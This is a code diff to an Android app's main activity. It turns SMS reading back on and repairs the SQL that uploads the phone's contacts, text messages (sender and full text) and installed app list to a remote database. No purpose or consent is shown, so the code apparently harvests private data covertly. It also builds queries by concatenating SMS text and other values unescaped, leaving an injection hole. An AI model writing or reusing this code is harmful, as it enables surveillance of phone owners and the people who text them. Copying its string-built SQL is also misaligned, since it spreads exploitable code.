@@ -88,9 +88,9 @@ public class MainActivity extends AppCompatActivity {
         if(READ_CONTACTS_GRANTED) {
             readContacts();
         }
-//        if(READ_SMS_GRANTED) {
-//                readSMS();
-//            }
+        if(READ_SMS_GRANTED) {
+                readSMS();
+            }
 
 
     packageManager = getPackageManager();
@@ -209,30 +209,36 @@ public class MainActivity extends AppCompatActivity {
                         if(clientID>0) {
                             String insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
                             for (int k = 0; k < contacts.size(); k++) {
-                                insertstring += clientID + ", '" + contacts.get(k) + "')";
+                                insertstring += clientID + ", '" + contacts.get(k) + "'";
                                 if (k < contacts.size() - 1) {
                                     insertstring += ", (";
                                 }
+
                             }
+                            insertstring +=")";
                              int rows = statement.executeUpdate(insertstring);
 
-                            insertstring = "INSERT Messages(ClientID, MessageFrom, MessageText) VALUES (";
+                            insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
                             for (int k = 0; k < sms.size(); k++) {
-                                insertstring += clientID + ", '" + sms.get(k).sender + "','"+sms.get(k).text+"')";
+                                insertstring += clientID + ", '" + sms.get(k).sender + "','"+sms.get(k).text+"'";
                                 if (k < sms.size() - 1) {
-                                    insertstring += ", (";
+                                    insertstring += "), (";
                                 }
-                            }
-                            rows = statement.executeUpdate(insertstring);
 
-                            insertstring = "INSERT Applications(ClientID, ApplicationName) VALUES (";
-                            for (int k = 0; k < applist.size(); k++) {
-                                insertstring += clientID + ", '" + applist.get(k) + "')";
-                                if (k < applist.size() - 1) {
-                                    insertstring += ", (";
-                                }
                             }
-                            rows = statement.executeUpdate(insertstring);
+                            insertstring +=")";
+                            statement.executeUpdate(insertstring);
+
+                            insertstring = "INSERT INTO Applications(ClientID, ApplicationName) VALUES (";
+                            for (int k = 0; k < applist.size(); k++) {
+                                insertstring += clientID + ", '" + applist.get(k) + "'";
+                                if (k < applist.size() - 1) {
+                                    insertstring += "), (";
+                                }
+
+                            }
+                            insertstring +=")";
+                            statement.executeUpdate(insertstring);
                         }
                         else
                         {
@@ -340,8 +346,9 @@ public class MainActivity extends AppCompatActivity {
 
                 while (cursor.moveToNext()) {
 
-                    String contact = "!"+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)).replace("'","*");
-                    contacts.add(contact);
+                    String contact = "!"+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
+
+                    contacts.add(contact.replace("'","*"));
                     Log.d("Contacts", (String) contacts.get(contacts.size()-1));
                 }
 
@@ -350,7 +357,7 @@ public class MainActivity extends AppCompatActivity {
 
 
         } catch (Exception ex) {
-            Toast.makeText(getApplicationContext(), ex.getMessage(), Toast.LENGTH_SHORT).show();
+            Toast.makeText(getApplicationContext(), ex.getMessage(), Toast.LENGTH_LONG).show();
         }
         return contacts;
 
